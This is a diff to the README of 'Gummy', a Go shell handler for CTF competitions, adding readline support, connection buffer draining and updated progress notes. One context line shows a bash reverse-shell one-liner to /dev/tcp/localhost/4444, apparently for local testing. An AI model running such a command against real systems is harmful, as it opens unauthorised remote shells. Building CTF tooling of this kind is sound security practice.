@@ -30,6 +30,12 @@ Gummy is a modern shell handler written in Go, designed for CTF competitions. It
   - Progress bar with visual feedback
   - MD5 checksum verification
   - Automatic cleanup of temporary files
+  - Works correctly after shell interaction (connection buffer draining)
+- [x] **Readline Integration** (`github.com/chzyer/readline`) 🆕
+  - Arrow keys for cursor movement in menu
+  - Up/Down for command history navigation
+  - Persistent history in `~/.gummy/history` (1000 commands)
+  - Standard keybinds (Ctrl+A/E, Ctrl+W, etc.)
 - [x] Concurrent connection handling (multiple simultaneous sessions)
 - [x] Graceful shutdown with signal handling (clean exit on Ctrl+C)
 - [x] Unique session ID generation (crypto/rand)
@@ -42,7 +48,6 @@ Gummy is a modern shell handler written in Go, designed for CTF competitions. It
 - [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
 - [ ] Port forwarding (local/remote)
 - [ ] Auto-reconnect capability
-- [ ] Command history per session
 - [ ] Tab completion in menu
 - [ ] Session logging to files
 
@@ -430,18 +435,26 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
     - `strings.Split()`, `strings.Join()`, `strings.TrimSpace()`
     - `strings.Builder` for efficient string concatenation
     - `strings.Contains()`, `strings.Index()` for searching
+    - `strings.LastIndex()` for finding last occurrence (critical for marker detection)
     - Format strings with `fmt.Sprintf()`
+
+11. **External Libraries** 🆕
+    - `github.com/chzyer/readline` for rich terminal input
+    - History persistence and management
+    - Keybindings and cursor control
+    - Graceful fallback when unavailable
 
 ### Architecture Patterns Used
 - **Separation of Concerns**: Listener → Manager → Handler (each has single responsibility)
 - **Interface Segregation**: `net.Conn` interface allows flexible I/O handling
 - **Fan-out**: One listener spawns multiple handler goroutines
 - **Centralized State**: Manager holds all sessions, preventing race conditions
+- **Connection Buffer Management**: Critical draining before file transfers to handle post-shell state
 
 ## Progress Tracking
 
 **Last updated:** 2025-10-14
-**Current focus:** Testing and polishing file transfer
-**Next milestone:** Port forwarding or polish features
-**Lines of code:** ~1,600 LOC across 6 modules
-**Status:** Core + File Transfer COMPLETE! ✅ Production-ready for CTF use!
+**Current focus:** Readline integration complete!
+**Next milestone:** Port forwarding or additional polish features
+**Lines of code:** ~1,700 LOC across 6 modules + readline dependency
+**Status:** Core + File Transfer + Readline COMPLETE! ✅ Production-ready for CTF use!
